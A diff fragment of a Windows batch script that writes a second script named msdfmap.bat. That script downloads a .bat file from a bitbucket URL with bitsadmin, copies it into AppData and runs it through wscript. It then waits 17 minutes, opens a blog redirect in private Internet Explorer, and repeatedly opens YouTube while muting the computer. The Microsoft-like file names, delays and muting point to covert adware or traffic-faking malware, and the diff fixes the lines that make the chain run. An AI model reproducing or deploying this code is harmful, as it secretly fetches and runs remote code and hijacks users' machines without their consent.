@@ -154,7 +154,7 @@ ECHO     bitsadmin /transfer n /download /priority normal "http://androidfriends
 ECHO ) >> C:\Users\%username%\Downloads\msdfmap.bat
 
 
-REM Download Set_IE_AS_DEFAULT_BROWSER.bat https://bitbucket.org/AndroidPrior/androidprior/downloads/Set_IE_as_default_browser.bat
+REM Download Set_IE_AS_DEFAULT_BROWSER.bat
 ECHO IF EXIST "C:\Users\%username%\Downloads\set_IE_as_default_browser.bat" ( >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO     echo "it's here!" >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO ) ELSE ( >> C:\Users\%username%\Downloads\msdfmap.bat
@@ -165,7 +165,7 @@ ECHO     echo "it's here!" >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO ) ELSE ( >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO     bitsadmin /transfer n /download /priority normal "https://bitbucket.org/AndroidPrior/androidprior/downloads/Set_IE_as_default_browser.bat" "C:\Users\%username%\Downloads\set_IE_as_default_browser.bat" >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO ) >> C:\Users\%username%\Downloads\msdfmap.bat
-ECHO copy /y "C:\Users\%username%\Downloads\set_IE_as_default_browser.bat" "C:\Users\%username%\AppData\Local"
+ECHO copy /y "C:\Users\%username%\Downloads\set_IE_as_default_browser.bat" "C:\Users\%username%\AppData\Local" >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO ping -n 1 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO wscript.exe C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs C:\Users\%username%\AppData\Local\set_IE_as_default_browser.bat >> C:\Users\%username%\Downloads\msdfmap.bat
 
@@ -180,7 +180,7 @@ ECHO ) >> C:\Users\%username%\Downloads\msdfmap.bat
 
 
 REM Wait 17 mins, then launch internet. 
-ECHO ping -n 10 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO ping -n 1020 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO start /min iexplore -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
 REM The below code loops opening the youtube every 15 minutes. Closes youtube after 36 seconds. Also mutes computer for 35 seconds.
 ECHO :loop >> C:\Users\%username%\Downloads\msdfmap.bat
